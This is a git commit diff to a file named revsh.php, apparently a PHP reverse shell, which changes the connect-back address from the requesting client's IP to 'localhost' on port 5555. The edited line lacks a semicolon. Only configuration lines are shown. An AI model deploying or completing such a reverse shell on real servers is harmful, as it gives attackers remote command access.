1f2919ebc8ca72df5dba742ec61b535cd1387385
Zyncypher <121335710+Rajiv-Stha@users.noreply.github.com>
2025-05-19 17:45:01 +0545

    idk fml

--- revsh.php
+++ revsh.php
@@ -2,7 +2,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = $_SERVER['REMOTE_ADDR'];  // CHANGE THIS
+// $ip = $_SERVER['REMOTE_ADDR'];  // CHANGE THIS
+$ip = "localhost"  // CHANGE THIS
 $port = 5555;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
